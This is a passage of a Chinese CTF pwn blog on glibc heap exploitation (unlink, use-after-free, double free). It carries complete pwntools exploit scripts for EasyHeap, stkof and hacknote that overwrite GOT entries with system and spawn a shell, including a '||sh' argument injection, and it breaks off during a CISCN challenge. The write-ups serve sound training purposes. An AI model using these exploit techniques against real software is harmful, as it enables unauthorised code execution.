<pre><code>经过上述的步骤，我们已经实现了在*(chunk)中写入了chunk-0x18的值
如过我向chunk - 0x18 写入__free_hook,在我下一次修改的时候就可以把__free_hook改写为system
</code></pre>
<h2 id="列题"><a class="header-anchor" href="#列题">¶</a>列题</h2>
<h3 id="ZJCTF-2019-EasyHeap"><a class="header-anchor" href="#ZJCTF-2019-EasyHeap">¶</a>ZJCTF 2019 EasyHeap</h3>
<p>这道题网上的wp大多都是house of spirit 以及 Unsorted bin attack, 这里介绍一种Unlink的攻击方式</p>
<h4 id="IDA分析"><a class="header-anchor" href="#IDA分析">¶</a>IDA分析</h4>
<p>add</p>
<p><img src="http://static.zybuluo.com/hgggg/be6e1prqqmpinvcx751v0xlp/39.png" alt="39.png-43.8kB"></p>
<p>可以看到add是用一个heaparray的数组来管理堆块的</p>
<p><img src="http://static.zybuluo.com/hgggg/ebbhnt7xr0p8sxtcrqky20zq/40.png" alt="40.png-19.9kB"></p>
<p>edit</p>
<p><img src="http://static.zybuluo.com/hgggg/icy3zhxsx8ifxfjuc1eezl92/41.png" alt="41.png-50.9kB"></p>
<p>delete</p>
<p><img src="http://static.zybuluo.com/hgggg/x6npivuk736g3yvmlb5dnw3k/42.png" alt="42.png-32kB"></p>
<p>同时该题也没开启PIE保护</p>
<p><img src="http://static.zybuluo.com/hgggg/ksgf2d6r9b7dr7d238ixo334/43.png" alt="43.png-23.7kB"></p>
<p>这题就非常适合利用Unlink手法来构造exp</p>
<h4 id="解题思路"><a class="header-anchor" href="#解题思路">¶</a>解题思路</h4>
<p>Step1:伪造fake chunk</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">add(<span class="number">0x30</span>,<span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">add(<span class="number">0xf0</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">add(<span class="number">0x100</span>,<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">add(<span class="number">0x100</span>,<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">payload = p64(<span class="number">0</span>) + p64(<span class="number">0x31</span>) + p64(chunk-<span class="number">0x18</span>)+p64(chunk-<span class="number">0x10</span>)+p64(<span class="number">0</span>)+p64(<span class="number">0</span>)+p64(<span class="number">0x30</span>)+p64(<span class="number">0x100</span>)</span><br><span class="line">edit(<span class="number">0</span>,<span class="built_in">len</span>(payload),payload)</span><br></pre></td></tr></table></figure>
<p>伪造后可以发现此时chunk0处于free状态</p>
<p><img src="http://static.zybuluo.com/hgggg/e5mmfpfyovlu8qpi6d4c8l4b/44.png" alt="44.png-21.6kB"></p>
<p>此时我们释放掉堆块1，可以发现堆块0和堆块1成功合并，触发Unlink</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">free(<span class="number">1</span>)</span><br></pre></td></tr></table></figure>
<p><img src="http://static.zybuluo.com/hgggg/toot7r72l7m2qjirr2sj3sue/45.png" alt="45.png-77.3kB"></p>
<p>Step2：任意地址写</p>
<p>可以看到chunk0已经指向了0x6020c8,我们可以通过edit(0)为system最后getshell</p>
<p><img src="http://static.zybuluo.com/hgggg/5w8ayit4cce7b0if21xr16st/46.png" alt="46.png-38.3kB"></p>
<h4 id="exp"><a class="header-anchor" href="#exp">¶</a>exp</h4>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p  = process(<span class="string">&quot;easyheap&quot;</span>)</span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line">libc = ELF(<span class="string">&#x27;libc-2.23.so&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;easyheap&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">size,content</span>):</span></span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Your choice :&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Size of Heap : &#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">    p.recvuntil(<span class="string">&quot;Content of heap:&quot;</span>)</span><br><span class="line">    p.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span>(<span class="params">idx</span>):</span></span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Your choice :&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Index :&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">idx,size,data</span>):</span></span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Your choice :&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Index :&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Size of Heap : &#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">    p.recvuntil(<span class="string">&quot;Content of heap : &quot;</span>)</span><br><span class="line">    p.sendline(data)</span><br><span class="line"></span><br><span class="line">chunk = <span class="number">0x6020E0</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x30</span>,<span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">add(<span class="number">0xf0</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">add(<span class="number">0x100</span>,<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">add(<span class="number">0x100</span>,<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload = p64(<span class="number">0</span>) + p64(<span class="number">0x31</span>) + p64(chunk-<span class="number">0x18</span>)+p64(chunk-<span class="number">0x10</span>)+p64(<span class="number">0</span>)+p64(<span class="number">0</span>)+p64(<span class="number">0x30</span>)+p64(<span class="number">0x100</span>)</span><br><span class="line">edit(<span class="number">0</span>,<span class="built_in">len</span>(payload),payload)</span><br><span class="line"></span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">gdb.attach(p)</span><br><span class="line">system = elf.plt[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">free_got = elf.got[<span class="string">&#x27;free&#x27;</span>]</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x18</span>+p64(system)+p64(system)+p64(free_got)</span><br><span class="line">edit(<span class="number">0</span>,<span class="built_in">len</span>(payload),payload)</span><br><span class="line">edit(<span class="number">2</span>,<span class="number">0x10</span>,p64(system))</span><br><span class="line">edit(<span class="number">3</span>,<span class="number">0x10</span>,<span class="string">b&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">free(<span class="number">3</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h3 id="hitcon2014-stkof"><a class="header-anchor" href="#hitcon2014-stkof">¶</a>hitcon2014_stkof</h3>
<h4 id="题目分析"><a class="header-anchor" href="#题目分析">¶</a>题目分析</h4>
<p>本题和上一题区别不大，唯一的区别就在于本题没有调用system函数，需要泄露libc地址</p>
<p>即把free_got 改为 puts_plt即可泄露地址</p>
<h4 id="exp-v2"><a class="header-anchor" href="#exp-v2">¶</a>exp</h4>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;stkof&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;libc-2.23.so&#x27;</span>)</span><br><span class="line"><span class="comment">#p = process(&quot;stkof&quot;)</span></span><br><span class="line">p = remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>,<span class="number">26259</span>)</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">size</span>):</span></span><br><span class="line">    p.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(size))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">idx,size,content</span>):</span></span><br><span class="line">    p.sendline(<span class="string">&quot;2&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">    p.sendline(content)</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span>(<span class="params">idx</span>):</span></span><br><span class="line">    p.sendline(<span class="string">&quot;3&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">chunk = <span class="number">0x602150</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x20</span>) <span class="comment">#1</span></span><br><span class="line">add(<span class="number">0x30</span>) <span class="comment">#2</span></span><br><span class="line">add(<span class="number">0xf0</span>) <span class="comment">#3</span></span><br><span class="line">add(<span class="number">0x100</span>) <span class="comment">#4</span></span><br><span class="line">add(<span class="number">0x100</span>) <span class="comment">#5</span></span><br><span class="line"></span><br><span class="line">payload =  p64(<span class="number">0</span>) + p64(<span class="number">0x31</span>) + p64(chunk-<span class="number">0x18</span>)+p64(chunk-<span class="number">0x10</span>)+p64(<span class="number">0</span>)+p64(<span class="number">0</span>)+p64(<span class="number">0x30</span>)+p64(<span class="number">0x100</span>)</span><br><span class="line">edit(<span class="number">2</span>,<span class="built_in">len</span>(payload),payload)</span><br><span class="line">free(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_plt = elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">atoi_got = elf.got[<span class="string">&#x27;atoi&#x27;</span>]</span><br><span class="line">free_got = elf.got[<span class="string">&#x27;free&#x27;</span>]</span><br><span class="line"></span><br><span class="line">payload =<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x18</span>+ p64(atoi_got)+p64(atoi_got)+p64(free_got)</span><br><span class="line">edit(<span class="number">2</span>,<span class="built_in">len</span>(payload),payload)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">4</span>,<span class="built_in">len</span>(p64(puts_plt)),p64(puts_plt))</span><br><span class="line">free(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">libc_base = u64(p.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>)) - libc.sym[<span class="string">&#x27;atoi&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">one = [<span class="number">0x45226</span>,<span class="number">0x4527a</span>,<span class="number">0xf03a4</span>,<span class="number">0xf1247</span>]</span><br><span class="line">system = libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">one_gadget = libc_base + one[<span class="number">2</span>]</span><br><span class="line"></span><br><span class="line">edit(<span class="number">4</span>,<span class="built_in">len</span>(p64(system)),p64(system))</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"><span class="comment">#p.sendline(&#x27;/bin/sh\x00&#x27;)</span></span><br><span class="line">edit(<span class="number">5</span>,<span class="number">0x8</span>,<span class="string">&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">free(<span class="number">5</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>pwn</category>
      </categories>
      <tags>
        <tag>pwn笔记</tag>
        <tag>glibc堆</tag>
      </tags>
  </entry>
  <entry>
    <title>UAF</title>
    <url>/2021/10/04/UAF/</url>
    <content><![CDATA[<p><img src="https://gitee.com/Nss-harukii/images/raw/master/40.jpg" alt="pic"></p>
<span id="more"></span>
<h2 id="原理"><a class="header-anchor" href="#原理">¶</a>原理</h2>
<pre><code>就是某块内存释放后，任能被用户使用，即存在野指针（一般是free后没有将指针置NULL）
</code></pre>
<h3 id="样例"><a class="header-anchor" href="#样例">¶</a>样例</h3>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">name</span> &#123;</span></span><br><span class="line">  <span class="keyword">char</span> *myname;</span><br><span class="line">  <span class="keyword">void</span> (*func)(<span class="keyword">char</span> *str);</span><br><span class="line">&#125; NAME;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">myprint</span><span class="params">(<span class="keyword">char</span> *str)</span> </span>&#123; <span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>, str); &#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">printmyname</span><span class="params">()</span> </span>&#123; <span class="built_in">printf</span>(<span class="string">&quot;call print my name\n&quot;</span>); &#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  NAME *a;</span><br><span class="line">  a = (NAME *)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(struct name));</span><br><span class="line">  a-&gt;func = myprint;</span><br><span class="line">  a-&gt;myname = <span class="string">&quot;I can also use it&quot;</span>;</span><br><span class="line">  a-&gt;func(<span class="string">&quot;this is my function&quot;</span>);</span><br><span class="line">  <span class="comment">// free without modify</span></span><br><span class="line">  <span class="built_in">free</span>(a);</span><br><span class="line">  a-&gt;func(<span class="string">&quot;I can also use it&quot;</span>);</span><br><span class="line">  <span class="comment">// free with modify</span></span><br><span class="line">  a-&gt;func = printmyname;</span><br><span class="line">  a-&gt;func(<span class="string">&quot;this is my function&quot;</span>);</span><br><span class="line">  <span class="comment">// set NULL</span></span><br><span class="line">  a = <span class="literal">NULL</span>;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;this pogram will crash...\n&quot;</span>);</span><br><span class="line">  a-&gt;func(<span class="string">&quot;can not be printed...&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="malloc内存对齐"><a class="header-anchor" href="#malloc内存对齐">¶</a>malloc内存对齐</h3>
<p>在大多数情况下，编译器和C库透明地帮你处理对齐问题。POSIX 标明了通过malloc( ), calloc( ), 和 realloc( ) 返回的地址对于任何的C类型来说都是对齐的。这样可以避免内存中的碎片，提高程序效率。</p>
<p>来看下malloc.h的部分源码</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#  <span class="meta-keyword">define</span> MALLOC_ALIGNMENT       (2 *SIZE_SZ &lt; __alignof__ (long double)   </span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MALLOC_ALIGN_MASK      (MALLOC_ALIGNMENT - 1)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* The smallest possible chunk */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MIN_CHUNK_SIZE        (offsetof(struct malloc_chunk, fd_nextsize))</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* The smallest size we can malloc is an aligned minimal chunk */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MINSIZE  \</span></span><br><span class="line"><span class="meta">  (unsigned long)(((MIN_CHUNK_SIZE+MALLOC_ALIGN_MASK) &amp; ~MALLOC_ALIGN_MASK))</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* pad request bytes into a usable size -- internal version */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> request2size(req)                                         \</span></span><br><span class="line"><span class="meta">  (((req) + SIZE_SZ + MALLOC_ALIGN_MASK &lt; MINSIZE)  ?             \</span></span><br><span class="line"><span class="meta">   MINSIZE :                                                      \</span></span><br><span class="line"><span class="meta">   ((req) + SIZE_SZ + MALLOC_ALIGN_MASK) &amp; ~MALLOC_ALIGN_MASK)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span> &#123;</span></span><br><span class="line"></span><br><span class="line">  INTERNAL_SIZE_T      prev_size;  <span class="comment">/* Size of previous chunk (if free).  */</span></span><br><span class="line">  INTERNAL_SIZE_T      size;       <span class="comment">/* Size in bytes, including overhead. */</span></span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">fd</span>;</span>         <span class="comment">/* double links -- used only if free. */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">bk</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Only used for large blocks: pointer to next larger size.  */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">fd_nextsize</span>;</span> <span class="comment">/* double links -- used only if free. */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">bk_nextsize</span>;</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>翻译翻译就是malloc在对其的时侯，其对其参数必须是2的幂且在32为下8byte,64位下为16byte</p>
<p>但是最小分配单位并不是对齐单位，最小分配单位MINSIZE：</p>
<p>计算MINSIZE=（16+8-1） &amp; ~（8-1）=16字节</p>
<p>即32位下malloc的最小分配单位为16字节，64位下最小分配单位为32字节。</p>
<p>其中request2size就是malloc的内存对齐操作。</p>
<p>从request2size还可以知道，如果是64位系统，申请内存为1~24字节时，系统内存消耗32字节，当申请内存为25字节时，系统内存消耗48字节。 如果是32位系统，申请内存为1~12字节时，系统内存消耗16字节，当申请内存为13字节时，系统内存消耗24字节。（类似计算MINSIZE）</p>
<h3 id="UAF-的利用"><a class="header-anchor" href="#UAF-的利用">¶</a>UAF 的利用</h3>
<p>当申请两个fastbin范围内的堆块后，fastbin如下图所示</p>
<p><img src="http://static.zybuluo.com/hgggg/i7inxma7n1gx14yc77t3f824/31.png" alt="31.png-16.6kB"></p>
<p>此时可以利用UAF修改chunk0的指针，当我们再次申请出这两个堆的时候，就可以申请到想要修改的地址处,进行后续的一些修改</p>
<h3 id="double-free"><a class="header-anchor" href="#double-free">¶</a>double free</h3>
<p>double free 和 UAF 一样同样也是由于指针为清空造成的漏洞，与UAF的漏洞利用方式差不多，常被用于与fastbin attack 组合利用</p>
<p>下面介绍一种利用double free 来达到任意地址写的利用方式</p>
<p>当申请两个堆块并且释放时fastbin中有如下结构：</p>
<pre><code>fastbin[Y] -&gt; chunk1 -&gt; chunk0
</code></pre>
<p>而此时我们再次释放chunk1</p>
<pre><code>fastbin[Y] -&gt; chunk0 -&gt;  &lt;- chunk1 
</code></pre>
<p>如果我们此时申请一个新的chunk</p>
<p><img src="http://static.zybuluo.com/hgggg/71qyoakamj0w6w0xbywxwzmp/32.png" alt="32.png-14.2kB"></p>
<p>此时修改new chunk的指针</p>
<p><img src="http://static.zybuluo.com/hgggg/fl430uwnapavh55zpng9hj8g/33.png" alt="33.png-19.6kB"></p>
<p>再申请一个chunk1</p>
<p><img src="http://static.zybuluo.com/hgggg/vevy3cstvblcgtha3rphjc9n/34.png" alt="34.png-17.1kB"></p>
<p>在申请一个chunk后这个chunk就会合chunk1重合，且fastbin链表已经指向了我们想要修改的地址了，只要再申请一个堆块就会申请到想要修改的地址，然后只要编辑这个堆块便可完成任意地址写。</p>
<p><img src="http://static.zybuluo.com/hgggg/wj1tdtf92h6wmo5khhpfl6st/35.png" alt="35.png-21.6kB"></p>
<h2 id="例题"><a class="header-anchor" href="#例题">¶</a>例题</h2>
<h3 id="hacknote"><a class="header-anchor" href="#hacknote">¶</a>hacknote</h3>
<h4 id="IDA-分析"><a class="header-anchor" href="#IDA-分析">¶</a>IDA 分析</h4>
<p>add<br>
<img src="http://static.zybuluo.com/hgggg/6ptrl1aq1a1u68hla9ixm5pg/25.png" alt="25.png-60.2kB"></p>
<p>delete<br>
<img src="http://static.zybuluo.com/hgggg/2oqox20pffmb7diztd5htwkl/26.png" alt="26.png-44.3kB"></p>
<h4 id="利用思路"><a class="header-anchor" href="#利用思路">¶</a>利用思路</h4>
<p><img src="http://static.zybuluo.com/hgggg/2n71il94qre8z0swlok1n29f/27.png" alt="27.png-77.8kB"></p>
<p>由上图可以看到，当我们申请一个note的时候，此时堆块的结构如下图所示</p>
<p><img src="http://static.zybuluo.com/hgggg/z1bunz0mfb0mxrboc7tgftsy/28.png" alt="28.png-23.5kB"></p>
<p>具体利用方式如下</p>
<p>我们申请两个note,在进行释放</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">add(<span class="number">0x20</span>,<span class="string">&#x27;aaaa&#x27;</span>)</span><br><span class="line">add(<span class="number">0x20</span>,<span class="string">&#x27;aaaa&#x27;</span>)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br></pre></td></tr></table></figure>
<p><img src="http://static.zybuluo.com/hgggg/fmih4vz2wd4oizhkb5tw9pm7/29.png" alt="29.png-24.9kB"></p>
<p>此时struct note被放到fastbin[0] , content 被放入fastbin<a href="http://static.zybuluo.com/hgggg/fl430uwnapavh55zpng9hj8g/33.png">3</a></p>
<p>如果我们申请一个大小在fastbin[0]范围内的堆note2,那么note2 的struct note 和 content就会分别是fastbin[0]中的note1,和note0的struct note</p>
<p>因此新建的note2的strcut note将被分配到note1的结构体位置，note2的content将被分配到note0的结构体位置，note0八字节的结构体处分别存放了打印函数0x804862b和其参数地址，现在将被我们输入的content覆盖</p>
<p>如果我们将content 覆盖为 __libc_start_main的地址 那么我们就可以泄露 libc 了 , 同理可以梅开二度getshell</p>
<p>这里还有一个小坑，覆盖后system的参数实际上是从note0结构体开始的，所以要用到system参数截断的姿势，如：&amp;&amp;sh，||sh，;sh;</p>
<p><img src="http://static.zybuluo.com/hgggg/76xhtazyt1dokdpz0a6xp6gv/30.png" alt="30.png-84kB"></p>
<p>可以看到最后成功调用了system(‘sh’)</p>
<h4 id="exp"><a class="header-anchor" href="#exp">¶</a>exp</h4>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#p = remote(&#x27;node4.buuoj.cn&#x27;,27510)</span></span><br><span class="line">p=process(<span class="string">&#x27;./hacknote&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;/lib/i386-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;hacknote&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">size,content</span>):</span></span><br><span class="line">	p.recvuntil(<span class="string">&#x27;Your choice :&#x27;</span>)</span><br><span class="line">	p.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">	p.recvuntil(<span class="string">&#x27;Note size :&#x27;</span>)</span><br><span class="line">	p.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">	p.recvuntil(<span class="string">&#x27;Content :&#x27;</span>)</span><br><span class="line">	p.send(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span>(<span class="params">index</span>):</span></span><br><span class="line">	p.recvuntil(<span class="string">&#x27;Your choice :&#x27;</span>)</span><br><span class="line">	p.sendline(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">	p.recvuntil(<span class="string">&#x27;Index :&#x27;</span>)</span><br><span class="line">	p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">index</span>):</span></span><br><span class="line">	p.recvuntil(<span class="string">&#x27;Your choice :&#x27;</span>)</span><br><span class="line">	p.sendline(<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">	p.recvuntil(<span class="string">&#x27;Index :&#x27;</span>)</span><br><span class="line">	p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line">libc_start_main = elf.got[<span class="string">&#x27;__libc_start_main&#x27;</span>]</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x20</span>,<span class="string">&#x27;aaaa&#x27;</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x20</span>,<span class="string">&#x27;aaaa&#x27;</span>)</span><br><span class="line"><span class="comment">#</span></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">gdb.attach(p)</span><br><span class="line">add(<span class="number">8</span>,p32(<span class="number">0x804862B</span>)+p32(libc_start_main))</span><br><span class="line">gdb.attach(p)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">libc_base = u32(p.recv(<span class="number">4</span>)) - <span class="number">0x18550</span> </span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">system = libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"></span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">add(<span class="number">8</span>,p32(system)+<span class="string">b&#x27;||sh&#x27;</span>)</span><br><span class="line">gdb.attach(p)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h3 id="CISCN-2021-西南赛区-crash"><a class="header-anchor" href="#CISCN-2021-西南赛区-crash">¶</a>CISCN 2021 西南赛区 crash</h3>
<p>这个题和HCTF的fheap，不能说是完全相同，只能说是一模一样了，但当时只有两个队做出来</p>
<p>这道题在网上的解法一般都是UAF，这里提供一种double free + ret2csu 的思路</p>
<h4 id="程序分析"><a class="header-anchor" href="#程序分析">¶</a>程序分析</h4>
<p>ADD</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> __int64 <span class="title">add</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [rsp+4h] [rbp-102Ch]</span></span><br><span class="line">  <span class="keyword">char</span> *ptr; <span class="comment">// [rsp+8h] [rbp-1028h]</span></span><br><span class="line">  <span class="keyword">char</span> *dest; <span class="comment">// [rsp+10h] [rbp-1020h]</span></span><br><span class="line">  <span class="keyword">size_t</span> nbytes; <span class="comment">// [rsp+18h] [rbp-1018h]</span></span><br><span class="line">  <span class="keyword">size_t</span> nbytesa; <span class="comment">// [rsp+18h] [rbp-1018h]</span></span><br><span class="line">  <span class="keyword">char</span> buf[<span class="number">4104</span>]; <span class="comment">// [rsp+20h] [rbp-1010h] BYREF</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v7; <span class="comment">// [rsp+1028h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v7 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  ptr = (<span class="keyword">char</span> *)<span class="built_in">malloc</span>(<span class="number">0x20</span>uLL);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Pls give data size:&quot;</span>);</span><br><span class="line">  nbytes = (<span class="keyword">int</span>)getInt();</span><br><span class="line">  <span class="keyword">if</span> ( nbytes &lt;= <span class="number">0x1000</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;data:&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> ( read(<span class="number">0</span>, buf, nbytes) == <span class="number">-1</span> )</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    nbytesa = <span class="built_in">strlen</span>(buf);</span><br><span class="line">    <span class="keyword">if</span> ( nbytesa &gt; <span class="number">0xF</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      dest = (<span class="keyword">char</span> *)<span class="built_in">malloc</span>(nbytesa);</span><br><span class="line">      <span class="keyword">if</span> ( !dest )</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">      <span class="built_in">strncpy</span>(dest, buf, nbytesa);</span><br><span class="line">      *(_QWORD *)ptr = dest;</span><br><span class="line">      *((_QWORD *)ptr + <span class="number">3</span>) = freeLong;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">strncpy</span>(ptr, buf, nbytesa);</span><br><span class="line">      *((_QWORD *)ptr + <span class="number">3</span>) = freeShort;</span><br><span class="line">    &#125;</span><br><span class="line">    *((_DWORD *)ptr + <span class="number">4</span>) = nbytesa;</span><br><span class="line">    <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">15</span>; ++i )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( 